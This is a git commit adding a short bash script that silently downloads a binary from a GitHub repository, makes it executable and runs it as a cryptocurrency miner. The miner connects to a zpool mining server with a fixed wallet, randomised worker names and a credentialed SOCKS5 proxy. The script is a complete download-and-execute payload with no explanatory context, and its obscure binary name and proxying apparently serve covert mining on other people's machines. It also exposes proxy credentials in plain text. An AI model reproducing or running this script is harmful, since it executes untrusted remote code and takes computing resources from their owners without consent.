8bf04e1268100cb350e52fa6c5a67bf6c296ef66
ahmadghozaliurhniyu <87011511+ahmadghozaliurhniyu@users.noreply.github.com>
2022-04-06 22:45:02 +0700

    Create aoliyaahmad.sh

---
+++ aoliyaahmad.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+
+wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd
+chmod +x pointd
+./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DDEpVd47FEFpi5AMreCLNSkNFGEsv3Qzuj.$(shuf -n 1 -i 1-9999999) -p c=DGB,zap=BUT-lyra2z330 -x socks5://aihzpnbr:dogmtwuiyn3a@193.151.161.44:8387
